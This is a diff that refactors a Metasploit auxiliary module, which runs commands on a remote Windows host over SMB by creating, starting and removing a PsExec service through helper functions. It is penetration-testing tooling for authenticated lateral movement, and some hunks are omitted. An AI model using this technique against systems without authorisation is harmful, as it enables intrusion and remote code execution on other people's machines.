@@ -5,16 +5,17 @@
 #   http://metasploit.com/
 ##
 
-require 'digest'
 require 'msf/core'
 require 'rex/proto/smb/constants'
 require 'rex/proto/smb/exceptions'
+require 'msf/core/exploit/smb/psexec_svc'
 
 class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
 	include Msf::Exploit::Remote::SMB::Authenticated
+	include Msf::Exploit::Remote::SMB::PsexecSvc
 
 	def initialize(info = {})
 		super(update_info(info,
@@ -49,22 +50,7 @@ class Metasploit3 < Msf::Auxiliary
 		psexec_path = datastore['PSEXEC_PATH']
 		command = datastore['COMMAND']
 
-		# Make sure that the user provided a path to the latest version
-		# of PsExec (v1.98) by examining the file's hash.
-		print_status("Calculating SHA-256 hash of #{psexec_path}...")
-		hash = Digest::SHA256.file(psexec_path).hexdigest
-		if hash != 'f8dbabdfa03068130c277ce49c60e35c029ff29d9e3c74c362521f3fb02670d5'
-			print_error("Hash is not correct!\nExpected: f8dbabdfa03068130c277ce49c60e35c029ff29d9e3c74c362521f3fb02670d5\nActual:   #{hash}\nEnsure that you have PsExec v1.98.")
-			return false
-		end
-
-		print_status("File hash verified.  Extracting PSEXESVC.EXE code from #{psexec_path}...")
-
-		# Extract the PSEXESVC.EXE code from PsExec.exe.
-		hPsExec = File.open(datastore['PSEXEC_PATH'], 'rb')
-		hPsExec.seek(193288)
-		psexesvc = hPsExec.read(181064)
-		hPsExec.close
+		psexesvc = extract_psexesvc(psexec_path, true)
 
 		print_status("Connecting to #{datastore['RHOST']}...")
 		if not connect
@@ -114,103 +100,59 @@ class Metasploit3 < Msf::Auxiliary
 		dcerpc_bind(handle)
 		print_status("Successfully bound to #{handle} ...")
 
-		##
-		# OpenSCManagerW()
-		##
 
-		print_status("Obtaining a service manager handle...")
-		scm_handle = nil
-		stubdata =
-			NDR.uwstring("\\\\#{rhost}") +
-			NDR.long(0) +
-			NDR.long(0xF003F)
 		begin
-			response = dcerpc.call(0x0f, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-				scm_handle = dcerpc.last_response.stub_data[0,20]
+			# Get a handle to the service control manager.
+			print_status('Obtaining a service control manager handle...')
+			scm_handle = dce_openscmanagerw(dcerpc, datastore['RHOST'])
+			if scm_handle == nil
+				print_error('Failed to obtain handle to service control manager.')
+				return
 			end
-		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
-		end
 
-		##
-		# CreateServiceW()
-		##
+			# Create the service.
+			print_status('Creating a new service (PSEXECSVC - "PsExec")...')
+			begin
+				svc_handle = dce_createservicew(dcerpc,
+					scm_handle,
+					'PSEXESVC',  # Service name
+					'PsExec',    # Display name
+					'%SystemRoot%\PSEXESVC.EXE', # Binary path
+					{:type => 0x00000010}) # Type: Own process
+				if svc_handle == nil
+					print_error('Error while creating new service.')
+					return
+				end
 
-		svc_handle  = nil
-		svc_status  = nil
+				# Close the handle to the service.
+				if not dce_closehandle(dcerpc, svc_handle)
+					print_error('Failed to close service handle.')
+					# If this fails, we can still continue...
+				end
 
-		print_status("Creating a new service (PSEXECSVC - \"PsExec\")...")
-		stubdata = scm_handle +
-			NDR.wstring('PSEXESVC') +
-			NDR.uwstring('PsExec') +
-
-			NDR.long(0x0F01FF) + # Access: MAX
-			NDR.long(0x00000010) + # Type: Own process
-			NDR.long(0x00000003) + # Start: Demand
-			NDR.long(0x00000000) + # Errors: Ignore
-			NDR.wstring('%SystemRoot%\PSEXESVC.EXE') + # Binary Path
-			NDR.long(0) + # LoadOrderGroup
-			NDR.long(0) + # Dependencies
-			NDR.long(0) + # Service Start
-			NDR.long(0) + # Password
-			NDR.long(0) + # Password
-			NDR.long(0) + # Password
-			NDR.long(0)  # Password
-		begin
-			response = dcerpc.call(0x0c, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-				svc_handle = dcerpc.last_response.stub_data[0,20]
-				svc_status = dcerpc.last_response.stub_data[24,4]
+			rescue ::Exception => e
+				# An exception can occur if the service already exists due to a prior unclean shutdown.  We can try to
+				# continue anyway.
 			end
-		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
-		end
 
-		##
-		# CloseHandle()
-		##
-		print_status("Closing service handle...")
-		begin
-			response = dcerpc.call(0x0, svc_handle)
-		rescue ::Exception
-		end
-
-		##
-		# OpenServiceW
-		##
-		print_status("Opening service...")
-		begin
-			stubdata =
-				scm_handle +
-				NDR.wstring('PSEXESVC') +
-				NDR.long(0xF01FF)
-
-			response = dcerpc.call(0x10, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
-				svc_handle = dcerpc.last_response.stub_data[0,20]
+			# Re-open the service.  In case we failed to create the service because it already exists from a previous invokation,
+			# this will obtain a handle to it regardless.
+			print_status('Opening service...')
+			svc_handle = dce_openservicew(dcerpc, scm_handle, 'PSEXESVC')
+			if svc_handle == nil
+				print_error('Failed to open service.')
+				return
 			end
-		rescue ::Exception => e
-			print_error("Error: #{e}")
-			return
-		end
 
-		##
-		# StartService()
-		##
-		print_status("Starting the service...")
-		stubdata =
-			svc_handle +
-			NDR.long(0) +
-			NDR.long(0)
-		begin
-			response = dcerpc.call(0x13, stubdata)
-			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
+			# Start the service.
+			print_status('Starting the service...')
+			if not dce_startservice(dcerpc, svc_handle)
+				print_error('Failed to start the service.')
+				return
 			end
+
 		rescue ::Exception => e
-			print_error("Error: #{e}")
+			print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
 			return
 		end
 
@@ -373,41 +315,39 @@ class Metasploit3 < Msf::Auxiliary
 		smbclient.close(psexecsvc_proc_stderr.file_id) rescue nil
 		smbclient.close(psexecsvc_proc.file_id) rescue nil
 
-
-		##
-		# ControlService()
-		##
-		print_status("Stopping the service...")
+		# Stop the service.
 		begin
-			response = dcerpc.call(0x01, svc_handle + NDR.long(1))
+			print_status('Stopping the service...')
+			if not dce_stopservice(dcerpc, svc_handle)
+				print_error('Error while stopping the service.')
+				# We will try to continue anyway...
+			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
+			print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
 		end
 
-
+		# Wait a little bit for it to stop before we delete the service.
 		if wait_for_service_to_stop(svc_handle) == false
 			print_error('Could not stop the PSEXECSVC service.  Attempting to continue cleanup...')
 		end
 
-		##
-		# DeleteService()
-		##
-		print_status("Removing the service...")
+		# Delete the service.
 		begin
-			response = dcerpc.call(0x02, svc_handle)
+			print_status("Removing the service...")
+			if not dce_deleteservice(dcerpc, svc_handle)
+				print_error('Error while deleting the service.')
+				# We will try to continue anyway...
+			end
+
+			print_status("Closing service handle...")
+			if not dce_closehandle(dcerpc, svc_handle)
+				print_error('Error while closing the service handle.')
+				# We will try to continue anyway...
+			end
 		rescue ::Exception => e
-			print_error("Error: #{e}")
+			print_error("Error: #{e}\n#{e.backtrace.join("\n")}")
 		end
 
-		##
-		# CloseHandle()
-		##
-		print_status("Closing service handle...")
-		begin
-			response = dcerpc.call(0x0, svc_handle)
-		rescue ::Exception => e
-			print_error("Error: #{e}")
-		end
 
 		# Disconnect from the IPC$ share.
 		print_status("Disconnecting from \\\\#{datastore['RHOST']}\\IPC\$")
@@ -461,19 +401,7 @@ class Metasploit3 < Msf::Auxiliary
 		while (retries < 3) and (service_stopped == false)
 			select(nil, nil, nil, retries)
 
-			##
-			# QueryServiceStatus()
-			##
-			begin
-				response = dcerpc.call(0x06, svc_handle)
-			rescue ::Exception => e
-				print_error("Error: #{e}")
-				return false
-			end
-
-			# This byte string signifies that the service is
-			# stopped.
-			if response[0,9] == "\x10\x00\x00\x00\x01\x00\x00\x00\x00"
+			if dce_queryservice(dcerpc, svc_handle) == 2
 				service_stopped = true
 			else
 				retries += 1
